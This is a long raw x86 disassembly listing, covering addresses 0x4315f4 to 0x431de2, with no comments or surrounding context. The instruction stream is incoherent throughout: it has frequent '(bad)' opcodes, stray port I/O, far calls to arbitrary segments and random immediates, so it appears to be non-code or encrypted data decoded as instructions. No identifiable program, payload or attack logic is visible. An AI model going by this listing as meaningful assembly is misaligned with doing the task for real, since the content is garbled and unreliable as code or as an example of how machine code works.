  4315f4:	add    BYTE PTR [eax],al
  4315f6:	bound  eax,QWORD PTR [eax+0x25]
  4315f9:	cs imul esp,esi,0x1c
  4315fd:	xchg   BYTE PTR [edx],dh
  4315ff:	(bad)  
  431600:	adc    esi,DWORD PTR [ebx-0x6a]
  431603:	dec    edx
  431604:	xlat   BYTE PTR ds:[ebx]
  431605:	push   ecx
  431606:	sub    eax,0xa20e7d16
  43160b:	inc    eax
  43160c:	mov    bh,dh
  43160e:	out    0x3f,eax
  431610:	nop
  431611:	inc    ecx
  431612:	add    cl,ch
  431614:	add    al,0xe1
  431616:	adc    edi,DWORD PTR [ecx]
  431618:	jg     0x4315a1
  43161a:	imul   eax,DWORD PTR ds:0xafe3edc,0x2f7944c6
  431624:	mov    ebp,0xd3337927
  431629:	mov    ah,0x86
  43162b:	or     al,0xaa
  43162d:	sub    edi,esp
  43162f:	bound  eax,QWORD PTR [eax+0x25]
  431632:	in     al,0x32
  431634:	inc    eax
  431635:	std    
  431636:	xchg   dh,dh
  431638:	and    al,0xe5
  43163a:	add    BYTE PTR [edx+0x40],ah
  43163d:	mov    dl,0x88
  43163f:	pusha  
  431640:	aad    0x87
  431642:	push   edx
  431643:	arpl   WORD PTR [ecx+0x4062fc2b],bx
  431649:	and    eax,0xfd4012cc
  43164e:	xchg   dh,ch
  431650:	(bad)  [ebx]
  431652:	call   0x572aefb9
  431657:	bound  esp,QWORD PTR [eax-0x18]
  43165a:	mov    ds,WORD PTR [ebx+0x6207ce41]
  431660:	fldcw  WORD PTR [ebp+0x47]
  431663:	jl     0x431640
  431665:	cmc    
  431666:	inc    ebx
  431667:	or     BYTE PTR [edi+0x1de2be94],dl
  43166d:	rol    DWORD PTR [edx+eiz*2],cl
  431670:	fldenv ds:0x6e8c620c
  431676:	sub    BYTE PTR [eax],al
  431678:	in     al,0x9b
  43167a:	jecxz  0x431600
  43167c:	cmp    ecx,esp
  43167e:	in     eax,0x3
  431680:	bound  ecx,QWORD PTR [edi-0x26ccee4a]
  431686:	xlat   BYTE PTR ds:[ebx]
  431687:	mov    dl,0xe4
  431689:	das    
  43168a:	jnp    0x431665
  43168c:	fmul   QWORD PTR [ebx+0x4dd86df]
  431692:	cmp    BYTE PTR [ecx+0x1adc30e6],cl
  431698:	or     BYTE PTR [ecx+0x0],al
  43169b:	push   esp
  43169c:	push   es
  43169d:	ss fs inc ebx
  4316a0:	jno    0x43163e
  4316a2:	outs   dx,BYTE PTR ds:[esi]
  4316a3:	call   0xd473:0xf432f061
  4316aa:	pop    esi
  4316ab:	ret    0xc359
  4316ae:	stos   BYTE PTR es:[edi],al
  4316af:	mov    ?,WORD PTR [ecx+0x69]
  4316b2:	je     0x43163c
  4316b4:	int    0x33
  4316b6:	call   0xc81b:0x1dedc51a
  4316bd:	pop    ebx
  4316be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4316bf:	pop    DWORD PTR [ebx+0x6592be9f]
  4316c5:	stos   DWORD PTR es:[edi],eax
  4316c6:	xchg   BYTE PTR [ebp+0x1f009785],ch
  4316cc:	dec    ecx
  4316cd:	in     eax,dx
  4316ce:	lock sti 
  4316d0:	fnsave ds:0xe3e9fcfa
  4316d6:	inc    eax
  4316d7:	jmp    0x2958254c
  4316dc:	add    ah,bl
  4316de:	adc    eax,0x34216afa
  4316e3:	pop    edx
  4316e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4316e5:	es je  0x4316f0
  4316e8:	jmp    0x42838c81
  4316ed:	push   edx
  4316ee:	pop    edi
  4316ef:	inc    edi
  4316f0:	loope  0x43176a
  4316f2:	test   al,0x24
  4316f4:	icebp  
  4316f5:	in     al,0xd9
  4316f7:	stc    
  4316f8:	xchg   ebp,eax
  4316f9:	sub    eax,0x59b9f9dd
  4316fe:	mov    ebx,0x5877d9fe
  431703:	shl    BYTE PTR [eax+0x72c69e68],0xa6
  43170a:	jbe    0x431714
  43170c:	jmp    0x633a7301
  431711:	sub    cl,bl
  431713:	shr    esi,0x71
  431716:	js     0x431758
  431718:	jmp    0xefb738a9
  43171d:	(bad)  
  43171e:	fldenv [esi-0x18]
  431721:	pop    edx
  431722:	in     al,0x52
  431724:	je     0x4316f9
  431726:	fadd   QWORD PTR [ebp-0x77255c51]
  43172c:	push   esi
  43172d:	push   ds
  43172e:	xor    eax,0x32ee93e1
  431733:	stc    
  431734:	jb     0x4316de
  431736:	fadd   st,st(1)
  431738:	out    0xbd,eax
  43173a:	push   esp
  43173b:	inc    eax
  43173c:	jmp    0xe9486cba
  431741:	add    BYTE PTR [ecx+0x27],ah
  431744:	inc    esp
  431745:	add    BYTE PTR [edi-0x3b390024],ah
  43174b:	js     0x4316e3
  43174d:	inc    eax
  43174e:	mov    ebx,0x76d72
  431753:	mov    ds:0xd89088e1,al
  431758:	add    BYTE PTR [ebx+0x4bb7244],cl
  43175e:	jnp    0x4317ca
  431760:	dec    esi
  431761:	mov    edx,DWORD PTR [edx]
  431763:	inc    bp
  431765:	and    al,0x6f
  431767:	add    BYTE PTR [ebx],dh
  431769:	(bad)  
  43176a:	sub    eax,0xa7c084d2
  43176f:	cmp    eax,DWORD PTR [edx-0x7e1e98b4]
  431775:	shl    BYTE PTR [ebx-0x73],1
  431778:	push   edi
  431779:	add    BYTE PTR [ebx],bh
  43177b:	gs jmp 0x158c7d06
  431781:	push   esi
  431782:	ins    BYTE PTR es:[edi],dx
  431783:	inc    esp
  431784:	int    0x13
  431786:	or     ebx,eax
  431788:	mov    ecx,DWORD PTR [edi+0x33]
  43178b:	push   0xffffff82
  43178d:	adc    DWORD PTR [esi+ebp*2],ebp
  431790:	or     DWORD PTR [ebx+0xe74d113],eax
  431796:	nop
  431797:	mov    ds:0xd81044e1,al
  43179c:	add    BYTE PTR [edx],dh
  43179e:	mov    ebx,0x7c25770
  4317a3:	fdiv   DWORD PTR [eax-0x36efffff]
  4317a9:	mov    cl,0xe6
  4317ab:	or     ebx,DWORD PTR [edx+0x6646c3a5]
  4317b1:	in     eax,0x83
  4317b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4317b4:	iret   
  4317b5:	jp     0x4317a3
  4317b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4317b8:	or     al,0xb9
  4317ba:	push   esi
  4317bb:	push   eax
  4317bc:	(bad)  
  4317bd:	mov    BYTE PTR [edx+eiz*2+0x26],al
  4317c1:	in     eax,dx
  4317c2:	mov    BYTE PTR [esi],ah
  4317c4:	push   ds
  4317c5:	jmp    0xf5693652
  4317ca:	mov    BYTE PTR [esi],ah
  4317cc:	push   ds
  4317cd:	fld    DWORD PTR [esi+0x4340461c]
  4317d3:	inc    esi
  4317d4:	ds sbb eax,0x864222a3
  4317da:	jae    0x431822
  4317dc:	sub    al,BYTE PTR [esi+0x2c3e3e43]
  4317e2:	and    ecx,ebp
  4317e4:	push   ebx
  4317e5:	stc    
  4317e6:	mov    WORD PTR [esi],cs
  4317e8:	out    0xf4,al
  4317ea:	xchg   BYTE PTR [ebx+0x50],ah
  4317ed:	sbb    BYTE PTR [edi+0x5e],cl
  4317f0:	(bad)  
  4317f1:	cmp    eax,0x8a039a73
  4317f6:	and    ebp,DWORD PTR [esi-0x53]
  4317f9:	mov    ecx,0xc1c55a23
  4317fe:	and    ebp,DWORD PTR [esi-0x47]
  431801:	mov    ecx,0x7ed85623
  431806:	ins    BYTE PTR es:[edi],dx
  431807:	bound  eax,QWORD PTR [eax+0x5b]
  43180a:	outs   dx,DWORD PTR ds:[esi]
  43180b:	add    BYTE PTR [ebp+0x40],dl
  43180e:	std    
  43180f:	mov    eax,0xfffd37ea
  431814:	or     cl,cl
  431816:	xor    cl,bh
  431818:	adc    eax,0x123411f1
  43181d:	pop    eax
  43181f:	inc    DWORD PTR [esi+esi*1]
  431822:	test   DWORD PTR ds:0xfdd840a2,ecx
  431828:	bound  eax,QWORD PTR [eax-0x3]
  43182b:	jae    0x4317e2
  43182d:	rol    BYTE PTR [ebp-0x5580781c],cl
  431833:	xchg   bl,dl
  431835:	mov    edi,0xd951ffd2
  43183a:	out    dx,al
  43183b:	push   ss
  43183c:	xchg   ebx,eax
  43183d:	xor    dh,ah
  43183f:	(bad)  
  431840:	push   esp
  431841:	cdq    
  431842:	out    0x82,eax
  431844:	sbb    ecx,0xffffffff
  431847:	fcmovnbe st,st(7)
  431849:	cdq    
  43184a:	out    0x16,eax
  43184c:	push   esi
  43184d:	mov    esi,edx
  43184f:	ret    
  431850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431851:	pop    ebp
  431852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431853:	xchg   ecx,eax
  431854:	popa   
  431855:	out    0xa7,eax
  431857:	sub    esp,DWORD PTR [ecx+0x60]
  43185a:	jmp    0x25d67ab2
  43185f:	add    BYTE PTR [edx-0x41],ah
  431862:	or     ebp,DWORD PTR [ebp+eax*8-0x75fc5c30]
  431869:	mov    al,ah
  43186b:	add    al,0x62
  43186d:	pop    esi
  43186e:	cmp    eax,0x644900aa
  431873:	lods   al,BYTE PTR ds:[esi]
  431874:	inc    edi
  431875:	lods   eax,DWORD PTR ds:[esi]
  431876:	mov    BYTE PTR [edx],ch
  431878:	icebp  
  431879:	sub    eax,0xcd03a7c8
  43187e:	mov    esp,0xa40a041b
  431883:	lods   eax,DWORD PTR ds:[esi]
  431884:	add    esp,DWORD PTR [edx+0x5e]
  431887:	pushf  
  431888:	xor    eax,ebx
  43188a:	lock call 0x98a18e20
  431890:	xlat   BYTE PTR ds:[ebx]
  431891:	loop   0x431887
  431893:	fnsave [ebx-0x6f18265a]
  431899:	dec    ecx
  43189a:	pop    esi
  43189b:	fwait
  43189c:	or     DWORD PTR [edx],ebp
  43189e:	(bad)  
  4318a0:	add    edx,edi
  4318a2:	fsubr  st(1),st
  4318a4:	(bad)  
  4318a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4318a7:	jmp    0xa421fa36
  4318ac:	add    esp,DWORD PTR [edx-0x27]
  4318af:	out    0x3d,al
  4318b1:	in     al,0x18
  4318b3:	add    dl,dh
  4318b5:	jns    0x43187a
  4318b7:	or     DWORD PTR [edx-0x56],ebp
  4318ba:	sub    eax,0x3a6659f9
  4318bf:	or     ebx,edx
  4318c1:	and    edx,esi
  4318c3:	mov    ebp,0x7d3a0262
  4318c8:	sbb    al,0x5a
  4318ca:	das    
  4318cb:	cs test eax,0xe8180179
  4318d1:	popa   
  4318d2:	jb     0x43185a
  4318d4:	call   0x747dcdd9
  4318d9:	and    al,0xba
  4318db:	inc    eax
  4318dc:	je     0x431886
  4318de:	mov    ch,0x11
  4318e0:	je     0x4318fe
  4318e2:	stos   BYTE PTR es:[edi],al
  4318e3:	jae    0x431959
  4318e5:	adc    BYTE PTR [edx-0x65eb8b8e],bl
  4318eb:	sbb    eax,0x2e95f874
  4318f0:	jae    0x4318d9
  4318f2:	loope  0x4318a4
  4318f4:	dec    DWORD PTR [ebx]
  4318f6:	repnz sti 
  4318f8:	cmp    al,0x7
  4318fa:	repnz int3 
  4318fc:	cmp    al,0xd7
  4318fe:	fucom  st(0)
  431900:	cmp    al,0xd7
  431902:	aad    0xe4
  431904:	cmp    al,0xa
  431906:	in     eax,dx
  431907:	fdivr  DWORD PTR [eax*4-0x73c3231b]
  43190e:	shl    ah,cl
  431910:	add    BYTE PTR [eax-0x108ccba2],0xe1
  431917:	mov    cl,0xfe
  431919:	ret    
  43191a:	in     eax,0x2f
  43191c:	cs test eax,0x29c0ffa3
  431922:	mov    ds:0x573e5289,eax
  431927:	(bad)
  43192a:	and    DWORD PTR [ecx],esi
  43192c:	xchg   BYTE PTR [eax],al
  43192e:	out    dx,al
  43192f:	fsubr  DWORD PTR [ecx+0x44]
  431932:	sti    
  431933:	popa   
  431934:	icebp  
  431935:	test   DWORD PTR ds:0x53244a,ebx
  43193b:	push   eax
  43193c:	aad    0x0
  43193e:	add    DWORD PTR [ebx-0x48dbc2a9],edi
  431944:	ins    BYTE PTR es:[edi],dx
  431945:	arpl   WORD PTR [eax],sp
  431947:	js     0x4319c8
  431949:	not    BYTE PTR ds:0x392c7f
  43194f:	dec    eax
  431950:	jg     0x4319a0
  431952:	dec    DWORD PTR [esi-0x74bfef30]
  431958:	popa   
  431959:	das    
  43195a:	test   DWORD PTR ds:0xa45bdb60,ecx
  431960:	pop    ax
  431962:	ret    
  431963:	adc    BYTE PTR [eax-0x3],al
  431966:	jb     0x431937
  431968:	fdivr  QWORD PTR [ecx-0x14]
  43196b:	push   ebx
  43196c:	push   0x54
  43196e:	push   esi
  43196f:	lock retf 
  431971:	cmp    dh,0x7b
  431974:	fdiv   st(0),st
  431976:	jg     0x43193e
  431978:	scas   eax,DWORD PTR es:[edi]
  431979:	stc    
  43197a:	inc    DWORD PTR [ebx+0x5c]
  43197d:	mov    dl,0x0
  43197f:	cmp    ebx,ebx
  431981:	add    BYTE PTR [edi],cl
  431983:	cld    
  431984:	repz dec esi
  431986:	(bad)  
  431987:	int    0xd5
  431989:	add    al,bh
  43198b:	in     al,0x5a
  43198d:	test   DWORD PTR [eax],0xbf80dc3b
  431993:	cmp    ebx,esp
  431995:	clc    
  431996:	inc    DWORD PTR [edx+ebx*1]
  431999:	icebp  
  43199a:	mov    eax,ds:0x3d4937
  43199f:	add    BYTE PTR [esi-0x16],bh
  4319a2:	je     0x4319b0
  4319a4:	jle    0x431942
  4319a6:	ins    DWORD PTR es:[edi],dx
  4319a7:	sbb    esp,DWORD PTR [edx-0x45]
  4319aa:	sub    eax,0x90364f88
  4319af:	inc    ebx
  4319b0:	bound  ebp,QWORD PTR [ebx+0x68df03c7]
  4319b6:	mov    DWORD PTR [ebx],ecx
  4319b8:	cdq    
  4319b9:	jnp    0x43194a
  4319bb:	pop    es
  4319bc:	cdq    
  4319bd:	dec    edi
  4319be:	add    al,0x82
  4319c0:	dec    ebx
  4319c1:	inc    ecx
  4319c2:	std    
  4319c3:	(bad)  
  4319c4:	fnstenv [ecx+0x7a]
  4319c7:	mov    edi,0xcd7a2ac9
  4319cc:	xor    ecx,DWORD PTR cs:[eax+0x3dbd663d]
  4319d3:	jae    0x431a2b
  4319d5:	sbb    eax,DWORD PTR [eax+0x6d]
  4319d8:	push   0x6b
  4319da:	cmp    al,0xa
  4319dc:	(bad)  
  4319de:	std    
  4319df:	jmp    DWORD PTR [edx-0x55]
  4319e2:	out    dx,eax
  4319e3:	test   BYTE PTR [eax-0xefc1558],dh
  4319e9:	jge    0x4319e8
  4319eb:	je     0x431984
  4319ed:	push   cs
  4319ee:	dec    esp
  4319ef:	sar    DWORD PTR [ecx],0xf2
  4319f2:	ror    al,1
  4319f4:	fstp   DWORD PTR [edi+0x68d4eed8]
  4319fa:	add    BYTE PTR [edx+eiz*2-0x707002c0],0x40
  431a02:	std    
  431a03:	inc    DWORD PTR [eax]
  431a05:	jb     0x431a51
  431a07:	icebp  
  431a08:	push   eax
  431a09:	out    dx,eax
  431a0a:	jl     0x4319e5
  431a0c:	xor    edi,eax
  431a0e:	inc    eax
  431a0f:	std    
  431a10:	cli    
  431a11:	mov    ebp,0x38420450
  431a16:	xor    bl,ch
  431a18:	arpl   WORD PTR [eax+eax*4-0x3],si
  431a1c:	jle    0x431a3c
  431a1e:	or     eax,0xd9464382
  431a23:	adc    ebx,DWORD PTR [esi+0x13348969]
  431a29:	push   esi
  431a2a:	adc    eax,edi
  431a2c:	ret    
  431a2d:	cmc    
  431a2e:	push   ebp
  431a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431a30:	cwde   
  431a31:	sub    eax,0x6303e771
  431a36:	fld    DWORD PTR [eax]
  431a38:	enter  0xed81,0x3c
  431a3c:	or     bl,BYTE PTR [ebx+0x3ccc0395]
  431a42:	leave  
  431a43:	outs   dx,BYTE PTR ds:[esi]
  431a44:	mov    al,ds:0x4968e981
  431a49:	mov    ebp,0x8413922e
  431a4e:	and    dh,cl
  431a50:	push   ds
  431a51:	les    esi,FWORD PTR [esi+0xd]
  431a54:	les    edi,FWORD PTR ds:0x6203b7d9
  431a5a:	mov    DWORD PTR [ebx+edx*1],ebx
  431a5d:	outs   dx,BYTE PTR ds:[esi]
  431a5e:	cmp    eax,0x638dc3d5
  431a63:	aaa    
  431a64:	jge    0x431ad4
  431a66:	aad    0xd6
  431a68:	mov    DWORD PTR [eax],0x335557d
  431a6e:	fistp  QWORD PTR [ebx-0x19]
  431a71:	add    esp,DWORD PTR [edx-0x16]
  431a74:	xor    bh,cl
  431a76:	jo     0x431a56
  431a78:	sbb    ax,0x2e5d
  431a7c:	out    0x50,eax
  431a7e:	push   ebp
  431a7f:	cs call 0xe799f988
  431a85:	add    esp,DWORD PTR [edx+0x49]
  431a88:	fadd   QWORD PTR [ebx]
  431a8a:	(bad)  
  431a8b:	fincstp 
  431a8d:	popf   
  431a8e:	pop    ecx
  431a8f:	mov    BYTE PTR [eax+ecx*8-0x7f],bl
  431a93:	sar    DWORD PTR ds:0x67d86204,1
  431a99:	mov    ah,0x68
  431a9b:	xchg   edi,eax
  431a9c:	add    bl,bh
  431a9e:	jo     0x431a65
  431aa0:	xlat   BYTE PTR fs:[ebx]
  431aa2:	and    DWORD PTR [esi],ebp
  431aa4:	jle    0x431a53
  431aa6:	add    eax,0xf605445d
  431aab:	mov    bl,0x1c
  431aad:	cmp    DWORD PTR [eax-0x94eecce],edi
  431ab3:	in     eax,dx
  431ab4:	add    BYTE PTR [ecx+eiz*4-0x1d],ch
  431ab8:	test   BYTE PTR [ebx-0xfff269f],dl
  431abe:	cmc    
  431abf:	stc    
  431ac0:	and    BYTE PTR [eax+esi*4],dh
  431ac3:	push   esi
  431ac4:	dec    esp
  431ac5:	int    0xb5
  431ac7:	out    0xcb,al
  431ac9:	sbb    ebp,DWORD PTR [edx+eiz*8-0x15ff404f]
  431ad0:	sbb    esi,DWORD PTR [ebp+esi*8+0x2c]
  431ad4:	stos   BYTE PTR es:[edi],al
  431ad5:	and    al,0xd9
  431ad7:	and    al,0x15
  431ad9:	and    eax,0xfd15bcab
  431ade:	js     0x431af6
  431ae0:	mov    ds:0xaa0ecd24,al
  431ae5:	and    al,0xf9
  431ae7:	out    0xed,eax
  431ae9:	push   0xf92d91e9
  431aee:	mov    esp,0x3d1332bb
  431af3:	ja     0x431ae2
  431af5:	add    BYTE PTR [edx+0x31],dh
  431af8:	popa   
  431af9:	adc    esp,ebp
  431afb:	hlt    
  431afc:	cwde   
  431afd:	add    BYTE PTR [edi+ecx*4-0x5b],ch
  431b01:	adc    esp,DWORD PTR [edx+0xd]
  431b04:	stc    
  431b05:	sbb    al,0x72
  431b07:	in     eax,dx
  431b08:	clc    
  431b09:	adc    dl,ch
  431b0b:	push   esi
  431b0c:	jecxz  0x431aff
  431b0e:	call   0x3002:0xc7fc09
  431b15:	stc    
  431b16:	add    BYTE PTR [ebp+esi*4+0x5],bl
  431b1a:	jae    0x431ae3
  431b1c:	fsubr  DWORD PTR [ecx]
  431b1e:	leave  
  431b1f:	adc    dh,0x87
  431b22:	dec    edx
  431b23:	pop    es
  431b24:	scas   al,BYTE PTR es:[edi]
  431b25:	adc    al,0xc
  431b27:	test   al,0x21
  431b29:	stc    
  431b2a:	mov    WORD PTR [ecx+0xb00f695],cs
  431b30:	mov    edi,esp
  431b32:	add    eax,DWORD PTR [eax]
  431b34:	sti    
  431b35:	fadd   DWORD PTR [edi-0x3e519cb8]
  431b3b:	xor    DWORD PTR [ebx+0x16754715],0xffffffb1
  431b42:	inc    ebx
  431b43:	add    al,0x40
  431b45:	inc    ebx
  431b46:	std    
  431b47:	cmp    ch,al
  431b49:	inc    ebx
  431b4a:	push   ss
  431b4b:	cmp    edx,esp
  431b4d:	push   edx
  431b4e:	adc    cl,BYTE PTR [ebx+0x40631d7d]
  431b54:	arpl   WORD PTR [ecx+0x72bbfff9],bx
  431b5a:	mov    BYTE PTR [edx-0x79],cl
  431b5d:	leave  
  431b5e:	adc    al,0x64
  431b60:	mov    ch,0x18
  431b62:	stc    
  431b63:	add    bh,0xd9
  431b66:	add    esi,0xc029d330
  431b6c:	mov    esp,0x85b5c6a
  431b71:	mov    eax,ds:0x71b5c331
  431b76:	cmp    cl,0x91
  431b79:	sbb    BYTE PTR [ebx+0x0],ah
  431b7c:	rcl    dl,1
  431b7e:	dec    esi
  431b7f:	and    DWORD PTR [ebp+0x7cff00d5],0x456414ca
  431b89:	sbb    cl,bh
  431b8b:	mov    al,BYTE PTR ds:0x62c479d4
  431b91:	ss jbe 0x431bd6
  431b94:	push   0xffffffb9
  431b96:	mov    es,WORD PTR [ebx]
  431b98:	add    BYTE PTR [ebp-0x16aebb8c],al
  431b9e:	xor    BYTE PTR [edx-0x4782710f],al
  431ba4:	cs or  eax,0x46017b4f
  431baa:	xor    edx,DWORD PTR [edx-0x2741deb]
  431bb0:	and    al,0x6f
  431bb2:	cs jl  0x431c0e
  431bb5:	pusha  
  431bb6:	mov    bh,0x34
  431bb8:	xchg   BYTE PTR [edx+ecx*1],dl
  431bbb:	push   ebx
  431bbc:	sti    
  431bbd:	(bad)  [edx-0x7f]
  431bc0:	mov    edi,0x2e7bdf4e
  431bc5:	mov    ecx,0x4fe8c908
  431bca:	sub    bh,BYTE PTR [ecx+eax*2+0x63]
  431bce:	mov    edi,0x36c90447
  431bd3:	leave  
  431bd4:	out    0x37,al
  431bd6:	or     eax,DWORD PTR [eax]
  431bd8:	mov    edx,0xc184411c
  431bdd:	pusha  
  431bde:	aas    
  431bdf:	or     eax,0x3a2e142
  431be4:	jl     0x431b89
  431be6:	(bad)  
  431be7:	scas   eax,DWORD PTR es:[edi]
  431be8:	xchg   BYTE PTR [ebx+edx*1-0x331eafbc],bl
  431bef:	hlt    
  431bf0:	outs   dx,BYTE PTR ds:[esi]
  431bf1:	push   ds
  431bf2:	inc    edx
  431bf3:	std    
  431bf4:	jae    0x431c5b
  431bf6:	dec    edx
  431bf7:	sub    cl,BYTE PTR [edi]
  431bf9:	bound  eax,QWORD PTR [edx-0x5a]
  431bfc:	mov    esi,0x172fb400
  431c01:	push   ecx
  431c02:	push   ebp
  431c03:	push   cs
  431c04:	inc    ecx
  431c05:	or     eax,0x67ad40a2
  431c0a:	jb     0x431be5
  431c0c:	xchg   esi,eax
  431c0d:	(bad)  
  431c0e:	cmp    eax,0x5223f42c
  431c13:	cdq    
  431c14:	out    0x86,eax
  431c16:	in     eax,dx
  431c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431c18:	loop   0x431c65
  431c1a:	push   es
  431c1b:	retf   0x3e7
  431c1e:	add    eax,0x6dd67099
  431c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431c24:	stos   DWORD PTR es:[edi],eax
  431c25:	add    ebx,ebx
  431c27:	in     al,0xdf
  431c29:	xchg   esp,eax
  431c2a:	mov    eax,ds:0xfdd970d9
  431c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431c30:	and    eax,DWORD PTR [ebx+ebp*8]
  431c33:	in     al,0xfb
  431c35:	xchg   edx,eax
  431c36:	mov    eax,ds:0xe9d960d9
  431c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431c3c:	sub    eax,DWORD PTR [eiz*8+0x2192ebe4]
  431c43:	fnstcw WORD PTR [esi+0x395def9]
  431c49:	or     BYTE PTR [edx],dh
  431c4b:	mov    edi,0x2abd9c27
  431c50:	call   0xfc6d2c58
  431c55:	(bad)  
  431c56:	push   edx
  431c57:	cdq    
  431c58:	out    0x7a,eax
  431c5a:	jae    0x431cb0
  431c5c:	jns    0x431bf7
  431c5e:	and    dh,0xa7
  431c61:	scas   al,BYTE PTR es:[edi]
  431c62:	add    BYTE PTR [edx],bh
  431c64:	push   ss
  431c65:	sbb    BYTE PTR [edi],cl
  431c67:	jbe    0x431c7e
  431c69:	aad    0xc3
  431c6b:	test   ecx,esi
  431c6d:	in     al,dx
  431c6e:	repz or al,0x95
  431c71:	out    0x97,eax
  431c73:	pusha  
  431c74:	jno    0x431caa
  431c76:	hlt    
  431c77:	ins    DWORD PTR es:[edi],dx
  431c78:	sub    dh,BYTE PTR [eax-0x657cebbe]
  431c7e:	jp     0x431c1e
  431c80:	loope  0x431c38
  431c82:	(bad)  
  431c83:	push   ebp
  431c84:	out    0x0,eax
  431c86:	adc    bl,bl
  431c88:	cs je  0x431c78
  431c8b:	loop   0x431c22
  431c8d:	and    al,0xf5
  431c8f:	icebp  
  431c90:	push   edx
  431c91:	inc    ecx
  431c92:	stc    
  431c93:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  431c95:	adc    al,0xe6
  431c97:	xchg   edi,eax
  431c98:	jmp    0x60c:0xa754b932
  431c9f:	sbb    edx,DWORD PTR [esi-0xf9e56f1]
  431ca5:	pop    ecx
  431ca6:	in     eax,dx
  431ca7:	jmp    0xc755:0x119e85de
  431cae:	pop    ebp
  431caf:	(bad)  
  431cb0:	xor    ebx,eax
  431cb2:	fbld   TBYTE PTR [edi+ebp*1-0x79]
  431cb6:	not    BYTE PTR ss:[edx+0x31]
  431cba:	bound  esp,QWORD PTR [edx+esi*1]
  431cbd:	cmp    bh,ch
  431cbf:	popa   
  431cc0:	fld    DWORD PTR [ebp+0x7327eabf]
  431cc6:	lods   eax,DWORD PTR ds:[esi]
  431cc7:	add    BYTE PTR [esi-0x33],cl
  431cca:	or     BYTE PTR [edx],bh
  431ccc:	call   0xf92f:0x520be129
  431cd3:	jb     0x431c67
  431cd5:	sub    DWORD PTR [esi+0x2d],ebp
  431cd8:	push   sp
  431cda:	stc    
  431cdb:	adc    eax,0xed712eb6
  431ce0:	ins    BYTE PTR es:[edi],dx
  431ce1:	lds    ecx,FWORD PTR [eax]
  431ce3:	fisub  DWORD PTR [ecx+0x8be8629]
  431ce9:	pop    ds
  431cea:	call   0x11c7cd1
  431cef:	jb     0x431d60
  431cf1:	push   ebp
  431cf2:	repnz aam 0x59
  431cf5:	(bad)  
  431cf6:	pop    edx
  431cf7:	pusha  
  431cf8:	jb     0x431d23
  431cfa:	outs   dx,BYTE PTR ds:[esi]
  431cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431cfc:	popa   
  431cfd:	pusha  
  431cfe:	sbb    eax,DWORD PTR [eax]
  431d00:	cmp    ecx,DWORD PTR [ebp+edi*1+0x0]
  431d04:	pop    eax
  431d05:	popf   
  431d06:	push   edx
  431d07:	pop    ecx
  431d08:	js     0x431d67
  431d0a:	in     eax,0xd0
  431d0c:	cmp    ebp,ebx
  431d0e:	add    bh,bh
  431d10:	mov    eax,ds:0x164b400b
  431d16:	add    al,0x10
  431d18:	enter  0xf920,0x73
  431d1c:	inc    ecx
  431d1d:	xchg   ebp,eax
  431d1e:	fcom   QWORD PTR [eax]
  431d20:	or     ebx,ebp
  431d22:	out    0xcd,eax
  431d24:	or     bl,ch
  431d26:	add    BYTE PTR [ebx+0x446a30d6],al
  431d2c:	add    bl,bh
  431d2e:	fdiv   QWORD PTR [edx+ecx*1+0x13]
  431d32:	or     esi,esi
  431d34:	call   DWORD PTR [eax*8-0x2304fe4c]
  431d3b:	push   ebx
  431d3c:	push   esi
  431d3d:	adc    BYTE PTR [eax],0x1
  431d40:	jae    0x431cd1
  431d42:	fisttp QWORD PTR [ebp+0x33]
  431d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431d46:	ret    0x3957
  431d49:	and    eax,0x401d74d1
  431d4e:	or     DWORD PTR [bx],ecx
  431d51:	sbb    eax,0x46502f1c
  431d56:	sbb    al,0x19
  431d58:	push   eax
  431d59:	aam    0x4f
  431d5b:	add    eax,0xf78aeff
  431d60:	inc    eax
  431d61:	mov    esp,DWORD PTR [ecx-0x6ef7f3c1]
  431d67:	add    eax,0x3fa1ceeb
  431d6c:	adc    BYTE PTR [eax],al
  431d6e:	outs   dx,DWORD PTR ds:[esi]
  431d6f:	add    eax,0x8c18b38b
  431d74:	inc    edx
  431d75:	jle    0x431d78
  431d77:	rol    esi,0x62
  431d7a:	xor    al,0x16
  431d7c:	mov    BYTE PTR [eax],bl
  431d7e:	xor    DWORD PTR [eax+0x41],edi
  431d81:	jb     0x431d36
  431d83:	ds add al,0xe9
  431d86:	jno    0x431d4d
  431d88:	xor    ah,BYTE PTR ss:[ebx-0x12]
  431d8c:	and    BYTE PTR es:[edx-0x6b],al
  431d90:	retf   
  431d91:	add    BYTE PTR [edx+0x32],ah
  431d94:	std    
  431d95:	dec    ebp
  431d96:	dec    edx
  431d97:	adc    al,0xed
  431d99:	add    BYTE PTR [edx-0x4d],ah
  431d9c:	dec    eax
  431d9d:	or     ebx,ecx
  431d9f:	jg     0x431d8e
  431da1:	xchg   BYTE PTR [edx+ebp*1+0x6fe90076],ch
  431da8:	xor    cl,0x97
  431dab:	nop
  431dac:	ja     0x431dea
  431dae:	bound  esp,QWORD PTR [ebx-0x4a6f003f]
  431db4:	or     al,0xa
  431db6:	ficomp WORD PTR [ebx-0x3]
  431db9:	jmp    DWORD PTR [edx-0x45]
  431dbc:	jmp    0x268d:0x4f253d3
  431dc3:	(bad)  
  431dc4:	clc    
  431dc5:	dec    edi
  431dc6:	aad    0xee
  431dc8:	or     bl,al
  431dca:	es (bad) 
  431dcc:	lock add BYTE PTR [edx+0x31],ah
  431dd0:	std    
  431dd1:	cli    
  431dd2:	push   edi
  431dd3:	(bad)  
  431dd4:	out    dx,al
  431dd5:	aas    
  431dd6:	bound  edi,QWORD PTR [ebp-0x44cd8cc3]
  431ddc:	rol    BYTE PTR [edi],cl
  431dde:	xor    esi,edi
  431de0:	add    al,0x85
  431de2:	xchg   esp,eax
